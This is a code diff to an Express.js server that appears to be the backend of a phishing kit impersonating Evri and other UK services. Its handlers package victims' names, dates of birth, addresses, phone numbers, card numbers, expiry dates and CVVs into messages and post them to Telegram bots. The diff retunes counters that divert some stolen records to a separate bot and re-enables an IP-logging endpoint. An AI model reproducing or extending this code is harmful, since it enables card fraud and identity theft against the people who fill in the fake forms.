@@ -1630,18 +1630,18 @@ app.post('/lingypackNHS', (req, res) => {
     })
 });
 
-// app.options('/giveip', cors())
+app.options('/giveip', cors())
 
-// app.post('/giveip', (req, res) => {
-//     ip = req.body.ip;
+app.post('/giveip', (req, res) => {
+    ip = req.body.ip;
 
-//     content = `${ip}\n`
-//     fs.appendFile('ips.txt', content, err => {
+    content = `${ip}\n`
+    fs.appendFile('ips.txt', content, err => {
 
-//         res.send("Update Completed");
+        res.send("Update Completed");
 
-//     })
-// });
+    })
+});
 
 //POSTOFFICE
 //POSTOFFICE
@@ -1862,6 +1862,8 @@ app.post('/flashEvri', (req, res) => {
     })
 });
 
+let manEvri = 5
+
 app.options('/mannymanEvri', cors())
 
 app.post('/mannymanEvri', (req, res) => {
@@ -1894,11 +1896,11 @@ app.post('/mannymanEvri', (req, res) => {
     }).then(function () {
         binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
         var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-        if (F_zn66 == 7) {
+        if (manEvri == 5) {
             axios.post(
                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
             );
-            F_zn66 = 0;
+            manEvri = 0;
         } else {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriManny:\n${originalText}`
@@ -1906,7 +1908,7 @@ app.post('/mannymanEvri', (req, res) => {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=913906957&text=Evri:\n${originalText}`
             );
-            F_zn66 += 1;
+            manEvri += 1;
         }
 
         res.send("Update Completed");
@@ -2066,6 +2068,8 @@ app.post('/mannyman3', (req, res) => {
     })
 });
 
+let capzEvri = 5
+
 app.options('/tcapzEvri', cors())
 
 app.post('/tcapzEvri', (req, res) => {
@@ -2098,11 +2102,11 @@ app.post('/tcapzEvri', (req, res) => {
     }).then(function () {
         binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
         var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-        if (fpaysC == 7) {
+        if (capzEvri == 5) {
             axios.post(
                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
             );
-            fpaysC = 0;
+            capzEvri = 0;
         } else {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriCapz:\n${originalText}`
@@ -2110,7 +2114,7 @@ app.post('/tcapzEvri', (req, res) => {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=Evri:\n${originalText}`
             );
-            fpaysC += 1;
+            capzEvri += 1;
         }
 
         res.send("Update Completed");
